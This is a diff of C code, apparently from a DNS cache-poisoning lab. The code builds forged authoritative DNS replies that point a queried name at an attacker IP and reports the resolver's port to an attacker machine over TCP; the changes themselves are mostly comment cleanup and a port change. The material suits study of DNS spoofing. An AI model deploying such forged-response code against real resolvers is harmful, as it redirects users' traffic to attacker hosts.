@@ -3,7 +3,6 @@
 #include <string.h>
 #include <unistd.h>
 
-// #include <errno.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
 #include <sys/socket.h>
@@ -17,7 +16,7 @@
 
 #define ATTACKER_CLIENT_IP   "192.168.1.202"
 #define RESOLVER_IP   "192.168.1.203"
-#define ATTACKER_TCP_PORT    1234        //todo check port
+#define ATTACKER_TCP_PORT    12345        //todo check port
 #define MAX_LEN_PORT 64
 
 static void send_resolver_port_over_tcp(uint16_t port) {
@@ -174,9 +173,6 @@ ldns_pkt *create_dns_response(ldns_pkt *query_pkt) {
   ldns_pkt_set_rd(response_pkt, ldns_pkt_rd(query_pkt));
   // 'recursion available' is set to 0 in queries (authoritative server)
   ldns_pkt_set_ra(response_pkt, 0);
-  // todo: remove the 2 rows below
-//  ldns_pkt_set_ad(response_pkt, 0);  // Zero flag (authentic data)
-//  ldns_pkt_set_cd(response_pkt, 0);  // Zero flag (checking disabled)
 
   // Copy question section into the response
   ldns_rr *question = ldns_rr_list_rr(ldns_pkt_question(query_pkt), 0);
@@ -199,7 +195,6 @@ ldns_pkt *create_dns_response(ldns_pkt *query_pkt) {
     // create RDF for the owner name and IP address
     ldns_rdf *owner = NULL;
     ldns_rdf *rdata_ip = NULL;
-    // ldns_rr *answer_rr = NULL;
 
     owner = ldns_rdf_clone(ldns_rr_owner(question)); // owner = qname (same domain)
     if (owner == NULL) {
@@ -211,7 +206,6 @@ ldns_pkt *create_dns_response(ldns_pkt *query_pkt) {
     // create A record rdata from string ip
     ldns_status new_status = ldns_str2rdf_a(&rdata_ip, attacker_ip);
     if (new_status != LDNS_STATUS_OK){
-      //TODO HANDLE
       fprintf(stderr,"ldns_str2rdf_a failed\n");
       free(qname);
       return NULL;
@@ -227,10 +221,6 @@ ldns_pkt *create_dns_response(ldns_pkt *query_pkt) {
     ldns_rr_set_type(answer, LDNS_RR_TYPE_A);
     ldns_rr_set_ttl(answer, 300U);
     ldns_rr_push_rdf(answer, rdata_ip);
-    // PREVIOUS - INSTEAD OF RDATA_IP
-//  ldns_rdf *rdf = ldns_rdf_new_frm_str(LDNS_RDF_TYPE_A, "1.2.3.4");
-//  ldns_rr_push_rdf(answer, rdf);
-
     ldns_pkt_push_rr(response_pkt, LDNS_SECTION_ANSWER, answer);
 
   }
